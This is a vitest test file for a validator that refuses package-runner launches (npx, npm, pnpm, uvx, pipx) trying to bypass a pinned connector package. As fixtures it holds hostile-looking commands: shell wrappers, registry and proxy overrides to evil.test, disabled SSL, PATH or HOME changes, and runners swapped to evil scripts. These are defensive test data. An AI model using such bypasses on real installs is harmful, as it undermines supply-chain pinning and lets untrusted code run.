// The bypasses of a pin that HAL-2559 closes: a shell, shell options,
// options and variables that move the folder, config, trust or program
// lookup, and a package option that runs another program.

import type { ConnectorPin } from "@halonicjs/ports";
import { verifies } from "@halonicjs/testing-spec";
import { expect, it } from "vitest";
import { checkPackageRunnerLaunch, type StdioTransport } from "./package-runner.ts";

const pin: ConnectorPin = {
  registry: "npm",
  registryUrl: "https://registry.npmjs.org",
  package: "@acme/mail-mcp",
  version: "2.3.1",
};

function stdio(overrides: Partial<StdioTransport> = {}): StdioTransport {
  return {
    kind: "stdio",
    command: "npx",
    args: ["-y", "@acme/mail-mcp@2.3.1"],
    env: {},
    ...overrides,
  };
}

/** The reason the launch was refused, or a failed test when it passed. */
function refused(transport: StdioTransport): string {
  const check = checkPackageRunnerLaunch(transport);
  if (check.ok) {
    throw new Error(`expected a refusal, but it passed with ${JSON.stringify(check.value)}`);
  }
  return check.error;
}

verifies("app.package-runner-launch", () => {
  it("refuses a pin behind a shell, whatever the shell runs", () => {
    expect(refused(stdio({ pin, command: "sh", args: ["-c", "npx -y @acme/mail-mcp"] }))).toBe(
      'the command starts the shell "sh", which can change the registry, config or package before the runner starts, so a pin can\'t be checked',
    );
    const wrapped: [string, string[]][] = [
      ["sh", ["-c", "NPM_CONFIG_REGISTRY=https://evil.test npx -y @acme/mail-mcp"]],
      ["bash", ["-c", "npm config set registry https://evil.test; npx -y @acme/mail-mcp"]],
      ["/bin/zsh", ["-c", "echo registry=https://evil.test > .npmrc && npx -y @acme/mail-mcp"]],
      ["CMD.EXE", ["/c", "npx --registry=https://evil.test -y @acme/mail-mcp"]],
      ["pwsh", ["-c", "npx -y @acme/mail-mcp@^2.3.1"]],
      ["powershell", ["-Command", "node server.js"]],
    ];
    for (const [command, args] of wrapped) {
      expect(refused(stdio({ pin, command, args })), command).toContain("a pin can't be checked");
    }
  });

  it("refuses a pin on any program that isn't a package runner", () => {
    const args = ["NPM_CONFIG_REGISTRY=https://evil.test", "npx", "-y", "@acme/mail-mcp"];
    expect(refused(stdio({ pin, command: "env", args }))).toBe(
      "the command starts \"env\", which isn't a package runner, so a pin can't be checked",
    );
    const others: [string, string[]][] = [
      ["dash", ["-c", "npx -y @acme/mail-mcp"]],
      ["fish", ["-c", "npx -y @acme/mail-mcp"]],
      ["ksh", ["-c", "npx -y @acme/mail-mcp"]],
      ["busybox", ["sh", "-c", "npx -y @acme/mail-mcp"]],
      ["wsl", ["npx", "-y", "@acme/mail-mcp"]],
      ["node", ["evil.js"]],
    ];
    for (const [command, args] of others) {
      expect(refused(stdio({ pin, command, args })), command).toContain("isn't a package runner");
    }
  });

  it("refuses a pinned npm or pnpm runner whose -c or --call runs a shell command", () => {
    expect(refused(stdio({ pin, args: ["-p", "@acme/mail-mcp", "-c", "mail-mcp"] }))).toBe(
      "the command sets -c, which runs a shell command that can change the registry, config or package before the runner starts, so a pin can't be checked",
    );
    const refusedArgs: [string, string[]][] = [
      ["npm", ["exec", "--package=@acme/mail-mcp", "--call=mail-mcp"]],
      ["pnpm", ["--shell-mode", "dlx", "@acme/mail-mcp"]],
    ];
    for (const [command, args] of refusedArgs) {
      expect(refused(stdio({ pin, command, args })), command).toContain("runs a shell command");
    }
  });

  it("refuses a pinned runner with an option that moves its folder, config, trust or proxy", () => {
    const refusedArgs: [string, string[]][] = [
      ["npx", ["--prefix", "./evil", "-y", "@acme/mail-mcp"]],
      ["npx", ["-C", "./evil", "-y", "@acme/mail-mcp"]],
      ["pnpm", ["--dir=./evil", "dlx", "@acme/mail-mcp"]],
      ["pnpm", ["--config.registry=https://evil.test", "dlx", "@acme/mail-mcp"]],
      ["yarn", ["--cwd", "./evil", "dlx", "@acme/mail-mcp"]],
      ["uvx", ["--directory", "./evil", "@acme/mail-mcp"]],
      ["uvx", ["--project=./evil", "@acme/mail-mcp"]],
      ["uvx", ["--with-requirements", "./evil.txt", "@acme/mail-mcp"]],
      ["uvx", ["--with-editable", "./evil", "@acme/mail-mcp"]],
      ["uvx", ["-c", "./evil.txt", "@acme/mail-mcp"]],
      ["uvx", ["--allow-insecure-host", "evil.test", "@acme/mail-mcp"]],
      ["pipx", ["run", "--trusted-host=evil.test", "@acme/mail-mcp"]],
      ["npx", ["--proxy", "http://evil.test", "-y", "@acme/mail-mcp"]],
      ["npx", ["--https-proxy=http://evil.test", "-y", "@acme/mail-mcp"]],
      ["npx", ["--cafile", "./evil.pem", "-y", "@acme/mail-mcp"]],
      ["npx", ["--strict-ssl=false", "-y", "@acme/mail-mcp"]],
      ["npx", ["--node-options=--require ./evil.js", "-y", "@acme/mail-mcp"]],
    ];
    for (const [command, args] of refusedArgs) {
      expect(refused(stdio({ pin, command, args })), `${command} ${args.join(" ")}`).toContain(
        "could fetch the pinned package from somewhere other than",
      );
    }
  });

  it("refuses a variable that moves the config home or the program lookup", () => {
    expect(refused(stdio({ pin, env: { HOME: "./evil-home" } }))).toBe(
      "the connector's environment sets HOME, which could make the runner read another config, cache or program",
    );
    for (const name of [
      "UserProfile",
      "APPDATA",
      "LOCALAPPDATA",
      "xdg_config_home",
      "XDG_CACHE_HOME",
      "PATH",
      "Path",
      "PATHEXT",
      "COMSPEC",
    ]) {
      expect(refused(stdio({ pin, env: { [name]: "x" } })), name).toContain(
        "could make the runner read another config, cache or program",
      );
    }
  });

  it("refuses a pinned runner whose -p, --package, --from, --with or --spec runs another program", () => {
    expect(
      refused(stdio({ pin, args: ["-y", "-p", "@acme/mail-mcp@2.3.1", "sh", "./evil.sh"] })),
    ).toBe(
      'the command fetches the pin with -p but runs "sh", and a pinned runner may only run "@acme/mail-mcp" or "mail-mcp"',
    );
    expect(refused(stdio({ pin, args: ["--package=@acme/mail-mcp"] }))).toBe(
      "the command fetches the pin with --package but names no program to run",
    );
    const pypiPin: ConnectorPin = { ...pin, registry: "pypi", package: "mail-mcp" };
    const refusedArgs: [string, string[]][] = [
      ["npm", ["exec", "--package", "@acme/mail-mcp", "--", "node", "evil.js"]],
      ["uvx", ["--from", "mail-mcp==2.3.1", "python", "./evil.py"]],
      ["uvx", ["--with", "mail-mcp", "other-tool"]],
      ["pipx", ["run", "--spec", "mail-mcp==2.3.1", "python", "./evil.py"]],
    ];
    for (const [command, args] of refusedArgs) {
      const pypi = command === "uvx" || command === "pipx";
      const transport = stdio({ pin: pypi ? pypiPin : pin, command, args });
      expect(refused(transport), `${command} ${args.join(" ")}`).toContain("may only run");
    }
  });

  it("refuses a pinned runner whose command word is another package than the pin's", () => {
    expect(refused(stdio({ pin, args: ["-y", "other-pkg", "@acme/mail-mcp"] }))).toBe(
      'the command starts "other-pkg", but the pin is for "@acme/mail-mcp"',
    );
    const pypiPin: ConnectorPin = { ...pin, registry: "pypi", package: "mail-mcp" };
    const uvx = stdio({ pin: pypiPin, command: "uvx", args: ["other-tool", "mail-mcp"] });
    expect(refused(uvx)).toContain('starts "other-tool"');
    const python = stdio({ pin: pypiPin, command: "uvx", args: ["--python", "3.12", "mail-mcp"] });
    expect(refused(python)).toContain('starts "3.12"');
  });

  it("refuses a package option after the command word, before a --", () => {
    expect(refused(stdio({ pin, args: ["-y", "@acme/mail-mcp", "-p", "@acme/mail-mcp"] }))).toBe(
      'the command sets -p after "@acme/mail-mcp", which one runner reads as its own option and another passes on, so a pin can\'t be checked',
    );
    const pypiPin: ConnectorPin = { ...pin, registry: "pypi", package: "mail-mcp" };
    const refusedArgs: [string, ConnectorPin, string[]][] = [
      ["uvx", pypiPin, ["mail-mcp", "--from", "mail-mcp"]],
      ["uvx", pypiPin, ["mail-mcp", "--with=mail-mcp"]],
      ["npm", pin, ["exec", "@acme/mail-mcp", "--package", "@acme/mail-mcp"]],
      ["pipx", pypiPin, ["run", "mail-mcp", "--spec", "mail-mcp"]],
    ];
    for (const [command, commandPin, args] of refusedArgs) {
      const transport = stdio({ pin: commandPin, command, args });
      expect(refused(transport), `${command} ${args.join(" ")}`).toContain(
        "a pin can't be checked",
      );
    }
    const afterDashes = ["-y", "--", "@acme/mail-mcp", "-p", "work"];
    expect(checkPackageRunnerLaunch(stdio({ pin, args: afterDashes }))).toEqual({
      ok: true,
      value: pin,
    });
  });

  it("refuses --reg, npm's shortened --registry, wherever it stands", () => {
    const args = ["-y", "--reg=http://evil.test/", "@acme/mail-mcp"];
    expect(refused(stdio({ pin, args }))).toBe(
      "the command sets --reg=http://evil.test/, which could fetch the pinned package from somewhere other than https://registry.npmjs.org",
    );
    const late = ["exec", "@acme/mail-mcp", "--reg", "http://evil.test/"];
    expect(refused(stdio({ pin, command: "npm", args: late }))).toContain(
      "could fetch the pinned package from somewhere other than",
    );
  });

  it("refuses an option before the command word that a pinned runner doesn't allow", () => {
    expect(
      refused(stdio({ pin, args: ["-y", "--regis=http://evil.test/", "@acme/mail-mcp"] })),
    ).toBe(
      'the command sets --regis, which a pinned "npx" doesn\'t take: it may only set -y, --yes, -q, --quiet, --silent, -p, --package',
    );
    const pypiPin: ConnectorPin = { ...pin, registry: "pypi", package: "mail-mcp" };
    const refusedArgs: [string, ConnectorPin, string[]][] = [
      ["npx", pin, ["--YES", "@acme/mail-mcp"]],
      ["npx", pin, ["-yq", "@acme/mail-mcp"]],
      ["npm", pin, ["--loglevel=silly", "exec", "@acme/mail-mcp"]],
      ["pnpm", pin, ["dlx", "--regi=http://evil.test/", "@acme/mail-mcp"]],
      ["yarn", pin, ["dlx", "--cache-folder=./evil", "@acme/mail-mcp"]],
      ["bunx", pin, ["--registry-url", "@acme/mail-mcp"]],
      ["uvx", pypiPin, ["--offline", "mail-mcp"]],
      ["pipx", pypiPin, ["run", "--ind=http://evil.test/", "mail-mcp"]],
    ];
    for (const [command, commandPin, args] of refusedArgs) {
      const transport = stdio({ pin: commandPin, command, args });
      expect(refused(transport), `${command} ${args.join(" ")}`).toContain("doesn't take");
    }
  });

  it("refuses an option after the command word that npm exec reads as its own", () => {
    const args = ["exec", "@acme/mail-mcp", "--regis=http://evil.test/"];
    expect(refused(stdio({ pin, command: "npm", args }))).toBe(
      'the command sets --regis, which a pinned "npm" doesn\'t take: it may only set -y, --yes, -q, --quiet, --silent, -p, --package',
    );
    const passedOn: [string, string[]][] = [
      ["npx", ["-y", "@acme/mail-mcp", "--regis=work", "--inbox", "work"]],
      ["npm", ["exec", "--yes", "@acme/mail-mcp", "--", "--inbox", "work"]],
      ["pnpm", ["dlx", "@acme/mail-mcp", "--inbox", "work"]],
    ];
    for (const [command, words] of passedOn) {
      expect(checkPackageRunnerLaunch(stdio({ pin, command, args: words })), command).toEqual({
        ok: true,
        value: pin,
      });
    }
  });

  it("passes a pinned runner whose -p or --from runs the pin's own program", () => {
    const passing: [string, string[]][] = [
      ["npx", ["-y", "-p", "@acme/mail-mcp@2.3.1", "@acme/mail-mcp"]],
      [
        "npm",
        ["--yes", "exec", "--package=@acme/mail-mcp@2.3.1", "--", "mail-mcp", "--inbox", "work"],
      ],
    ];
    for (const [command, args] of passing) {
      expect(checkPackageRunnerLaunch(stdio({ pin, command, args })), command).toEqual({
        ok: true,
        value: pin,
      });
    }
    const pypiPin: ConnectorPin = { ...pin, registry: "pypi", package: "mail-mcp" };
    const pipx = stdio({
      pin: pypiPin,
      command: "pipx",
      args: ["run", "--spec", "mail-mcp==2.3.1", "mail-mcp"],
    });
    expect(checkPackageRunnerLaunch(pipx)).toEqual({ ok: true, value: pypiPin });
  });
});
